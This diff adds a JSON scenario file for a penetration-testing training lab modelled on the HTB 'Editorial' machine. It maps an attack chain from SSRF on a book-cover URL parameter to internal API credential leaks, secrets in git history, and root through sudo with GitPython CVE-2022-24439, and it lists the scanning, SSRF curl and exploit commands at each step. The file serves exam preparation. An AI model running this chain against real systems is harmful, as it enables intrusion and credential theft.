@@ -1,0 +1,138 @@
+{
+  "id": "ssrf-to-internal-api",
+  "title": "SSRF to Internal API",
+  "category": "linux-standalone",
+  "source": ["HTB Editorial"],
+  "designed_by": "lab-derived",
+  "description": "Single Linux machine: SSRF on book cover preview → port scan internal API (5000) → API endpoint leaks creds → dev user → git log → prod creds → sudo GitPython CVE-2022-24439 → root.",
+  "introduction": "This scenario teaches SSRF to reach internal services: use URL parameters to probe localhost, discover hidden APIs, and chain to privesc. Common web-app pattern for OSCP.",
+  "mental_model": "SSRF = server fetches URLs you control. Probe 127.0.0.1:5000, 3000, etc. Internal APIs often lack auth. Git history and sudo -l reveal privesc paths.",
+  "key_principles": [
+    "SSRF: inject URL param to fetch internal endpoints",
+    "Port scan via SSRF: try 127.0.0.1:5000, 3000, 8080",
+    "git log -p reveals committed secrets in history",
+    "sudo -l: GitPython CVE-2022-24439 for root",
+    "Internal API often has weaker auth than public app"
+  ],
+
+  "indicators": {
+    "difficulty": 5,
+    "cognitive_load": 4,
+    "enumeration_depth": 5,
+    "rabbit_hole_risk": 3,
+    "time_pressure": 3
+  },
+
+  "mitre": {
+    "tactics": ["TA0001", "TA0003", "TA0004", "TA0006"],
+    "techniques": [
+      {"id": "T1190", "name": "Exploit Public-Facing Application"},
+      {"id": "T1087", "name": "Account Discovery"},
+      {"id": "T1552.001", "name": "Credentials In Files"},
+      {"id": "T1068", "name": "Exploitation for Privilege Escalation"},
+      {"id": "T1046", "name": "Network Service Discovery"}
+    ]
+  },
+
+  "kill_chain_phases": ["T1-Recon", "T2-Web-Access", "T3-NonWeb-Access", "T4a-Linux-PrivEsc", "T5-Credentials"],
+
+  "environment": {
+    "machine_count": 1,
+    "network_count": 1,
+    "os_distribution": {"windows": 0, "linux": 1},
+    "has_ad": false,
+    "has_pivoting": false,
+    "has_client_side": false
+  },
+
+  "technique_tags": [
+    "ssrf", "internal-api", "git-log", "CVE-2022-24439", "GitPython",
+    "port-scan", "ffuf", "gobuster", "curl", "linpeas"
+  ],
+
+  "exam_relevance": {
+    "oscp_exam_format": false,
+    "pen200_modules": [6, 12, 16, 22],
+    "pattern_frequency": "medium",
+    "recommended_order": 2
+  },
+
+  "prerequisites": [],
+  "builds_on": [],
+
+  "networks": [
+    {"id": "external", "cidr": "10.10.11.0/24", "label": "External"}
+  ],
+
+  "machines": [
+    {
+      "id": "editorial",
+      "label": "EDITORIAL",
+      "ip": "10.10.11.20",
+      "os": "Linux",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {
+          "port": 80,
+          "name": "HTTP (Book App)",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "ssrf", "summary": "Book cover preview SSRF → internal port scan", "leads_to": "internal-api"}
+          ],
+          "commands": [
+            "nmap -sV 10.10.11.20",
+            "ffuf -u http://10.10.11.20/FUZZ -w /usr/share/wordlists/dirb/common.txt",
+            "# Find cover preview / book endpoint with URL parameter",
+            {"cmd": "curl 'http://10.10.11.20/cover?url=http://127.0.0.1:5000/'", "rationale": "Why: SSRF fetches internal API via URL param"},
+            "# Port scan via SSRF: try 127.0.0.1:5000, 3000, etc."
+          ]
+        },
+        {
+          "port": 5000,
+          "name": "Internal API",
+          "version": "internal",
+          "vulnerabilities": [
+            {"type": "info-disclosure", "summary": "API endpoint leaks credentials", "leads_to": "dev-creds"}
+          ],
+          "commands": [
+            {"cmd": "curl 'http://10.10.11.20/cover?url=http://127.0.0.1:5000/api/users'", "rationale": "Why: Internal API leaks creds; SSRF bypasses firewall"},
+            "# Or: curl 'http://10.10.11.20/cover?url=http://127.0.0.1:5000/config'",
+            "# Extract dev user creds from API response"
+          ]
+        }
+      ],
+      "privesc": [
+        {
+          "from": "dev",
+          "to": "root",
+          "technique": "sudo GitPython CVE-2022-24439",
+          "commands": [
+            "sudo -l",
+            {"cmd": "git log -p", "rationale": "Why: Git history often contains committed secrets"},
+            "# Find prod creds in git history",
+            "searchsploit -m 2022-24439",
+            {"cmd": "python3 CVE-2022-24439.py", "rationale": "Why: GitPython CVE gives root via sudo"}
+          ]
+        }
+      ],
+      "credentials": [
+        {"user": "dev", "type": "password", "source": "SSRF → internal API endpoint", "unlocks": ["editorial-ssh"]},
+        {"user": "prod", "type": "password", "source": "git log -p (prod config in history)", "unlocks": []}
+      ],
+      "alternatives": []
+    }
+  ],
+
+  "connections": [],
+
+  "attack_paths": [
+    {
+      "id": "path-editorial",
+      "name": "Editorial (SSRF → API → GitPython)",
+      "color": "#6bb8cc",
+      "steps": ["editorial"],
+      "description": "SSRF on book cover → port scan internal API 5000 → API leaks creds → dev → git log → prod creds → sudo GitPython CVE-2022-24439 → root"
+    }
+  ]
+}
